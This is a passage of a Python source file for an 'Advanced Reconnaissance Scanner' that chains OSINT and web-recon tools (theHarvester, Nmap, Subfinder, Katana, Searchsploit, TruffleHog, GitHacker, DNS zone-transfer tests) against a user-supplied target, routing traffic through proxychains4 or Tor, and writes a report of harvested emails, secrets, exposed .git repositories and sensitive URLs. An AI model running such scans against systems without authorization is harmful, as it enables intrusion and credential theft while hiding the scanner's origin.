                report_lines.append(f"- `{email}`\n")
            if len(theharvester_emails) > 20:
                report_lines.append(f"\n*... and {len(theharvester_emails)-20} more*\n")
        else:
            report_lines.append("*No emails found*\n")

        report_lines.append(f"""
    ### Subdomains
    """)
        if theharvester_subdomains:
            for sub in theharvester_subdomains[:20]:
                report_lines.append(f"- `{sub}`\n")
            if len(theharvester_subdomains) > 20:
                report_lines.append(f"\n*... and {len(theharvester_subdomains)-20} more*\n")
        else:
            report_lines.append("*No subdomains found*\n")

        # 10. SEARCHSPLOIT
        report_lines.append(f"""
    ## 🔍 SEARCHSPLOIT - VULNERABILITY SEARCH

    **Exploits/Vulnerabilities Found:** {len(searchsploit_findings)}

    📁 **All Findings:** `{self.results_dir}/searchsploit_all_findings.txt`
    📁 **Targeted Vulnerabilities:** `{self.results_dir}/searchsploit_vulnerabilities.txt`

    ### Sample Findings
    """)
        if searchsploit_findings:
            for item in searchsploit_findings[:20]:
                report_lines.append(f"- `{item}`\n")
            if len(searchsploit_findings) > 20:
                report_lines.append(f"\n*... and {len(searchsploit_findings)-20} more*\n")
        else:
            report_lines.append("*No vulnerabilities found*\n")

        # 11. TRUFFLEHOG
        report_lines.append(f"""
    ## 🔍 TRUFFLEHOG - SECRET SCANNING

    **Secrets Found:** {'Yes' if trufflehog_secrets else 'No'}

    📁 **Full Output:** `{self.results_dir}/trufflehog_secrets.txt`
    📁 **JSON Results:** `{self.results_dir}/trufflehog_all_secrets.json`

    ### Detected Secrets
    """)
        if trufflehog_secrets:
            # Show first few lines
            for line in trufflehog_secrets.split('\n')[:20]:
                if line.strip():
                    report_lines.append(f"- {line}\n")
        else:
            report_lines.append("*No secrets detected*\n")

        # 12. GITHACKER
        report_lines.append(f"""
    ## 🔍 GITHACKER - GIT REPOSITORY DISCOVERY

    **.git Repositories Found:** {len(githacker_findings)}

    📁 **Findings:** `{self.results_dir}/githacker_findings.txt`

    ### Repository Details
    """)
        if githacker_findings:
            for line in githacker_findings[:20]:
                report_lines.append(f"- {line}\n")
        else:
            report_lines.append("*No .git repositories found*\n")

        # 13. URL DEEP ANALYSIS
        report_lines.append(f"""
    ## 🔍 URL DEEP ANALYSIS - VULNERABILITY CATEGORIES

    **Total URLs Analyzed:** {sum(len(v) for v in url_categories.values()) if url_categories else 0}

    📁 **Full Analysis:** `{self.results_dir}/url_deep_analysis.txt`
    📁 **JSON Categories:** `{self.results_dir}/url_categories.json`

    ### Critical Findings
    """)
        if url_categories:
            critical = ['admin_panels', 'sensitive_files', 'config_files', 'database_files', 
                       'backup_files', 'git_repos', 'env_files', 'php_info', 'server_status']
            for cat in critical:
                if cat in url_categories and url_categories[cat]:
                    count = len(url_categories[cat])
                    report_lines.append(f"\n#### {cat.replace('_', ' ').title()} ({count})\n")
                    for url in url_categories[cat][:5]:
                        report_lines.append(f"- `{url}`\n")
                    if count > 5:
                        report_lines.append(f"\n*... and {count-5} more*\n")
        else:
            report_lines.append("*No URL categories available*\n")

        # 14. ZONE TRANSFER
        report_lines.append(f"""
    ## 🔍 DNS ZONE TRANSFER

    **Vulnerability Found:** {'⚠️ YES (CRITICAL)' if zone_transfer_data.get('successful_transfers', 0) > 0 else '✅ No'}

    📁 **Results:** `{self.results_dir}/zone_transfer_results.txt`
    📁 **Detailed Report:** `{self.results_dir}/zone_transfer_detailed_report.txt`

    ### Summary
    """)
        if zone_transfer_data:
            report_lines.append(f"- **Target:** {zone_transfer_data.get('target', 'N/A')}\n")
            report_lines.append(f"- **Successful Transfers:** {zone_transfer_data.get('successful_transfers', 0)}\n")
            report_lines.append(f"- **Nameservers Tested:** {len(zone_transfer_data.get('results', []))}\n")
            if zone_transfer_data.get('successful_transfers', 0) > 0:
                report_lines.append("\n⚠️ **WARNING:** Zone Transfer Vulnerability Confirmed!\n")
                for result in zone_transfer_data.get('results', []):
                    report_lines.append(f"- Nameserver: `{result.get('nameserver', 'Unknown')}` - Records: {len(result.get('records', []))}\n")
        else:
            report_lines.append("*No zone transfer data available*\n")

        # 15. SCREENSHOTS (GOWITNESS)
        screenshot_dir = f"{self.results_dir}/screenshots"
        if os.path.exists(screenshot_dir):
            screenshots = [f for f in os.listdir(screenshot_dir) if f.endswith('.png')]
            report_lines.append(f"""
    ## 📸 SCREENSHOTS (GOWITNESS)

    **Total Screenshots Taken:** {len(screenshots)}

    📁 **Screenshot Directory:** `{screenshot_dir}`

    ### Screenshot Files
    """)
            for sc in screenshots[:10]:
                size = os.path.getsize(f"{screenshot_dir}/{sc}")
                report_lines.append(f"- {sc} ({self._format_size(size)})\n")
            if len(screenshots) > 10:
                report_lines.append(f"\n*... and {len(screenshots)-10} more*\n")
        else:
            report_lines.append("\n*No screenshots available*\n")

        # ============ TOOLS USED ============
        report_lines.append(f"""
    ## 🛠️ TOOLS USED

    | Tool | Purpose | Proxy |
    |------|---------|-------|
    | Dmitry | Information gathering (WHOIS, IP, Portscan, Email) | {'Yes' if self.use_proxy else 'No'} |
    | Nmap | Port scanning | No |
    | Subfinder | Subdomain discovery | No |
    | crt.sh + HackerTarget + dig | Subdomain discovery | No |
    | HTTPX | Live host validation | {'Yes' if self.use_proxy else 'No'} |
    | Gowitness | Screenshots | No |
    | Katana | URL discovery | No |
    | WebDork | Google dorking | No |
    | Searchsploit | Vulnerability search | No |
    | TruffleHog | Secret scanning | No |
    | GitHacker | Git repository discovery | No |
    | WHOIS | WHOIS lookup | No |
    | Netcraft | Server/OS information | {'Yes' if self.use_proxy else 'No'} |
    | theHarvester | OSINT email/subdomain harvesting | {'Yes' if self.use_proxy else 'No'} |

    ---

    ## 📁 OUTPUT FILES

    | File | Size |
    |------|------|
    """)

        for file_path, size in sorted(all_files.items()):
            rel_path = os.path.relpath(file_path, os.getcwd())
            report_lines.append(f"| `{rel_path}` | {self._format_size(size)} |\n")

        # ============ PROXY & CONFIGURATION ============
        report_lines.append(f"""

    ## 🔒 PROXY INFORMATION

    **Proxy Enabled:** {self.use_proxy}
    **Proxy Tool:** Proxychains4
    **Proxy Config:** {self.proxy_config if self.use_proxy else 'N/A'}

    ### How Proxy Works
    - **DNS Tools:** Subfinder - Run without proxy for speed
    - **HTTP Tools:** HTTPX, Katana - Run through proxy (if enabled)
    - **Python Requests:** Netcraft, theHarvester - Use SOCKS5 proxy
    - **Recon-ng:** Uses system proxy settings

    ---

    ## ⚠️ DISCLAIMER

    This report was generated for **educational and authorized testing purposes only**.

    - Unauthorized scanning or testing of systems is **illegal**
    - Always obtain proper authorization before scanning
    - The user assumes all responsibility for any misuse

    ---

    ## 📌 SCAN COMPLETION

    - **Scan Completed At:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    - **Total Duration:** N/A (manual run)
    - **Results Directory:** `{self.results_dir}`

    *Generated by Advanced Reconnaissance Scanner v2.0 - Proxychains4 Edition*
    """)

        # ============ SAVE REPORT ============
        final_report = ''.join(report_lines)

        # Save as Markdown
        report_md = f"{self.results_dir}/FINAL_REPORT.md"
        with open(report_md, 'w', encoding='utf-8') as f:
            f.write(final_report)

        print(f"{Colors.GREEN}✅ Detailed final report generated: {report_md}{Colors.RESET}")

        # ============ JSON REPORT (already exists, but we update if needed) ============
        json_report = {
            'target': self.target,
            'clean_target': self.clean_target,
            'timestamp': datetime.now().isoformat(),
            'subdomains': self.subdomains,
            'live_hosts': self.live_hosts,
            'ips': self.ips,
            'open_ports': getattr(self, 'open_ports', []),
            'directories': self.directories,
            'urls': self.urls,
            'dmitry_emails': dmitry_emails,
            'dmitry_ports': dmitry_ports,
            'theharvester_emails': theharvester_emails,
            'theharvester_subdomains': theharvester_subdomains,
            'subfinder_subdomains': subfinder_subdomains,
            'katana_urls': katana_urls,
            'webdork_urls': webdork_urls,
            'searchsploit_findings': searchsploit_findings,
            'trufflehog_secrets': trufflehog_secrets,
            'githacker_findings': githacker_findings,
            'zone_transfer': zone_transfer_data,
            'results_dir': self.results_dir,
            'proxy_used': self.use_proxy,
            'proxy_tool': 'Proxychains4',
            'proxy_config': self.proxy_config if self.use_proxy else None,
            'total_files': len(all_files),
            'total_size_bytes': total_size,
            'tools_used': [
                'Dmitry', 'Nmap', 'Subfinder', 'crt.sh', 'HackerTarget',
                'dig', 'HTTPX', 'Gowitness', 'Katana', 'WebDork',
                'Searchsploit', 'TruffleHog', 'GitHacker', 'WHOIS', 'Netcraft', 'theHarvester'
            ]
        }

        json_path = f"{self.results_dir}/report.json"
        with open(json_path, 'w') as f:
            json.dump(json_report, f, indent=2)

        print(f"{Colors.GREEN}✅ JSON report generated: {json_path}{Colors.RESET}")

        # ============ PRINT SUMMARY ============
        print(f"\n{Colors.CYAN}📊 Report Summary:{Colors.RESET}")
        print(f"{Colors.BLUE}   • Subdomains: {len(self.subdomains)}{Colors.RESET}")
        print(f"{Colors.BLUE}   • Live Hosts: {len(self.live_hosts)}{Colors.RESET}")
        print(f"{Colors.BLUE}   • Open Ports: {len(self.open_ports) if hasattr(self, 'open_ports') else 0}{Colors.RESET}")
        print(f"{Colors.BLUE}   • URLs Found: {len(self.urls)}{Colors.RESET}")
        print(f"{Colors.BLUE}   • Files Generated: {len(all_files)}{Colors.RESET}")
        print(f"{Colors.BLUE}   • Total Size: {self._format_size(total_size)}{Colors.RESET}")


    

    # ============ HELPER METHOD ============
    def _format_size(self, size):
        """Format file size in human readable format"""
        for unit in ['B', 'KB', 'MB', 'GB']:
            if size < 1024.0:
                return f"{size:.1f} {unit}"
            size /= 1024.0
        return f"{size:.1f} TB"

    def _get_port_service(self, port):
        """Get service name for common ports"""
        services = {
            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
            53: 'DNS', 80: 'HTTP', 110: 'POP3', 111: 'RPC (Portmapper)',
            135: 'MS RPC', 139: 'NetBIOS', 143: 'IMAP', 443: 'HTTPS',
            445: 'SMB', 465: 'SMTPS', 993: 'IMAPS', 995: 'POP3S',
            3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
            5900: 'VNC', 6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt'
        }
        return services.get(port, 'Unknown')

    # ==================== MAIN SCAN FUNCTION ====================
    def run_all_scans(self):
        print(f"""
{Colors.BOLD}{Colors.MAGENTA}
╔═══════════════════════════════════════════════════════════════════╗
║     ADVANCED RECONNAISSANCE SCANNER v2.0 - PROXYCHAINS4 EDITION ║
║     Complete OSINT & Web Reconnaissance Tool                    ║
║     Kali Linux Optimized - Anonymous Scanning                   ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
        """)

        print(f"{Colors.CYAN}🎯 Target: {self.target}{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Results: {self.results_dir}{Colors.RESET}")
        print(f"{Colors.CYAN}🔒 Proxy: {'Enabled (Proxychains4)' if self.use_proxy else 'Disabled'}{Colors.RESET}")
        print(f"{Colors.YELLOW}{'='*70}{Colors.RESET}")

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 0: Checking Dependencies{Colors.RESET}")
        self.check_dependencies()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 1: Installing All Required Tools{Colors.RESET}")
        self.install_all_tools()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 2: theHarvester - OSINT Email & Subdomain Harvesting{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Multiple sources: crtsh, hackertarget, duckduckgo, etc.{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Email harvesting and subdomain discovery{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Shodan integration (if API key set){Colors.RESET}")
        self.run_theharvester_all()


        # ============ DMITRY - ADD THIS STEP ============
           
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 3: DMITRY - Complete Information Gathering{Colors.RESET}")
        print(f"{Colors.YELLOW}   • All 16 Dmitry Options{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Whois, IP, Port Scan, Netcraft, Email Harvest{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Live Terminal Output{Colors.RESET}")
        print(f"{Colors.YELLOW}   • All Results Saved{Colors.RESET}")
        self.run_dmitry_all()  # ← Complete version with all options

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 4: Port Scanning{Colors.RESET}")
        self.port_scan()
        # ========== DNS Zone Transfer Testing ==================

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 5: DNS Zone Transfer Testing{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Testing for DNS misconfiguration{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Multiple methods: dig, nslookup, host, Python{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Complete vulnerability assessment{Colors.RESET}")
        self.run_zone_transfer_tests()  # ← নতুন ফাংশন

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 6: WHOIS Lookup{Colors.RESET}")
        self.run_whois_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 7: Netcraft Information{Colors.RESET}")
        self.run_netcraft()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 8: Subfinder - Subdomain Discovery{Colors.RESET}")
        self.run_subfinder_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 9: Subdomain Discovery (crt.sh + HackerTarget + dig){Colors.RESET}")
        self.run_amass_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 10: HTTPX - Live Host Validation{Colors.RESET}")
        self.run_httpx_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 11: Gowitness - Screenshots{Colors.RESET}")
        self.run_gowitness_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 12: Katana - URL Discovery{Colors.RESET}")
        self.run_katana_all()

        # ============ STEP 10.5: URL Deep Analysis ============
        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 13: URL Deep Analysis - Vulnerability & Sensitive Data Discovery{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Analyze all discovered URLs{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Find admin panels, sensitive files, API endpoints{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Identify potential attack vectors{Colors.RESET}")
        print(f"{Colors.YELLOW}   • Categorize and save results{Colors.RESET}")
        self.analyze_urls_deep()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 14: WebDork - Google Dorks{Colors.RESET}")
        self.run_webdork_fixed()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 15: Searchsploit - Vulnerability Search{Colors.RESET}")
        self.run_searchsploit_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 16: TruffleHog - Secret Scanning{Colors.RESET}")
        self.run_trufflehog_all()

        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 18: GitHacker - Git Repository Discovery{Colors.RESET}")
        self.run_githacker_all()


        print(f"\n{Colors.BOLD}{Colors.MAGENTA}📦 STEP 19: Generating Final Report{Colors.RESET}")
        self.generate_report()

        print(f"\n{Colors.MAGENTA}{'='*70}{Colors.RESET}")
        print(f"{Colors.BOLD}✅ ALL SCANS COMPLETED!{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Results: {self.results_dir}{Colors.RESET}")
        print(f"{Colors.CYAN}📄 Report: {self.results_dir}/FINAL_REPORT.md{Colors.RESET}")
        if self.use_proxy:
            print(f"{Colors.CYAN}🔒 Proxy: Proxychains4 - {self.proxy_config}{Colors.RESET}")
        print(f"{Colors.MAGENTA}{'='*70}{Colors.RESET}")

def main():
    print(f"""
{Colors.BOLD}{Colors.CYAN}
╔═══════════════════════════════════════════════════════════════════╗
║     PROXYCHAINS4 ENABLED RECONNAISSANCE SCANNER                 ║
║     Anonymous Web Reconnaissance Tool                           ║
║     All traffic routed through Tor/Proxy                       ║
╚═══════════════════════════════════════════════════════════════════╝
{Colors.RESET}
    """)

    if os.geteuid() != 0:
        print(f"{Colors.YELLOW}⚠️ Some tools need sudo permissions for installation.{Colors.RESET}")
        print(f"{Colors.YELLOW}⚠️ Run with: sudo python3 {sys.argv[0]} {sys.argv[1] if len(sys.argv) > 1 else ''}{Colors.RESET}")

    use_proxy = True
    target = None

    if len(sys.argv) > 1:
        target = sys.argv[1]
        if len(sys.argv) > 2 and sys.argv[2].lower() in ['--no-proxy', '-np']:
            use_proxy = False
    else:
        target = input(f"{Colors.YELLOW}Enter target (IP or URL): {Colors.RESET}")
        proxy_choice = input(f"{Colors.YELLOW}Use proxychains4 for anonymity? (y/n, default: y): {Colors.RESET}")
        if proxy_choice.lower() in ['n', 'no']:
            use_proxy = False

    if not target:
        print(f"{Colors.RED}❌ No target!{Colors.RESET}")
        sys.exit(1)

    scanner = ReconScanner(target, use_proxy=use_proxy)
    scanner.run_all_scans()

if __name__ == "__main__":
    main()